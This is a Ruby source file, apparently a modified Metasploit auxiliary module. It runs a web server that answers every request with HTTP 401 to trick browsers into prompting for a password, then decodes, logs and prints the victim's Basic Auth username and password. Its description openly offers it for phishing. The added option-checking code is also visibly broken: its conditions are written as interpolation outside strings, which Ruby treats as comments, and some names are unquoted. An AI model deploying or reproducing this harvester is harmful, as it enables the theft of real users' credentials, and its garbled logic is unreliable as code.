##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'HTTP Client Basic Authentication Credential Collector',
      'Description'    => %q{
        This module responds to all requests for resources with a HTTP 401.  This should
        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds
        they are sent to the console.

        This may be helpful in some phishing expeditions where it is possible to embed a
        resource into a page.

        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
      },
      'Author'      => ['Tech Sd (www.youtube.com/thetechsd1)'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    ))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
        OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ]),
	OptString.new('SETCRDU', [false, "Checks for the user name to see if it is correct"]),
	OptString.new('SETCRDP', [false, "Sets the creds to look for"]),
	OptString.new('CHKCRDS', [true, "The option to check for creds"]),
	OptString.new('CHKONLYPASS', [false, "Checks only the password"]),
	OptString.new('CHKONLYUSER', [false, "Checks only the username"])

      ], self.class)
  end

  # Not compatible today
  def support_ipv6?
    false
  end

  def run #We set all the options here.
    @myhost   = datastore['SRVHOST']
    @myport   = datastore['SRVPORT']
    @realm    = datastore['REALM']
    @chkcrd = datastore['CHKCRDS']
    @username = datastore['SETCRDU']
    @password = datastore['SETCRDP']
    @cop = datastore['CHKONLYPASS']
    @cou = datastore['CHKONLYUSER']


    if #{datastore['CHKCRDS']} == "false"
	print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
	print_status("Not checking for creds")       
	exploit
		

   end
	if #{datastore['CHKCRDS']} == "true" and #{datastore['CHKONLYUSER']} == "false"
	   if #{datastore['CHKONLYPASS']} == "false"
	     print_status("Checking for creds(both the username and password)")
	     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
	     exploit
		
   end	
  end

	if #{datastore['CHKCRDS']} == "true" and #{datastore['CHKONLYUSER']} == "true"
      if #{datastore['CHKONLYPASS']} == "false"
    print_status("Checking for creds (only the username)")
    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
    exploit
  end
 end

  if #{datastore['CHKCRDS']} == "true" and #{datastore[CHKONLYPASS]} == "true"
    if #{datastore['CHKONLYUSER']} == "false"

      print_status("Checking for creds (only the password)")
      print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
      exploit

    
  end
 end
end

  def on_request_uri(cli, req)
    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
      basic,auth = req['Authorization'].split(/\s+/)
      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)

      report_auth_info(
        :host        => cli.peerhost,
        :port        => datastore['SRVPORT'],
        :sname       => 'HTTP',
        :user        => user,
        :pass        => pass,
        :source_type => "captured",
        :active      => true
      )

      if #{datastore['CHKCRDS']} == "false"
        print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
        print_status("Credentials are not set to be matched")
      elsif #{datastore['CHKCRDS']} == "true"
        if #{datastore['CHKONLYUSER']} == "false" and #{datastore['CHKONLYPASS']} == "false"
          print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
          if #{datastore['SETCRDU']} == #{user} and #{datastore['SETCRDP']}
            print_good("Credentials matched! - Set User: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
          else
            print_status("Credentials do not match!! - Set Username: #{datastore[SETCRDU]} Set Password: #{datastore['SETCRDP']}")
            
          end
          if #{datastore['SETCRDU']} == #{user} and #{datastore['SETCRDP']} == #{pass}
            print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
            print_good("Credentials matched! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
          else
            print_status("Credentials do not match!! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
            
          end
          
        end
        if #{datastore['CHKCRDS']} == "true" and #{datastore['CHKONLYUSER']} == "true"
          if #{datastore['CHKONLYPASS']} == "false"
            print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
            print_good("Credentials matched! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
          else
            print_status("Credentials do not match!! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")

          
        end
      end
      

       
if datastore['RedirectURL']
        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
        send_redirect(cli, datastore['RedirectURL'])
      else
        send_not_found(cli)
	print_status("Redirect Failed! URL: #{datastore['RedirectURL']} At server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
      end
    else
      print_status("Sending 401 to client #{cli.peerhost}")
      response = create_response(401, "Error: Webpage not found try again later") #Add res. option
      print_good("401 recevived! Server:#{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
      response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
      cli.send_response(response)
    end
  end

end
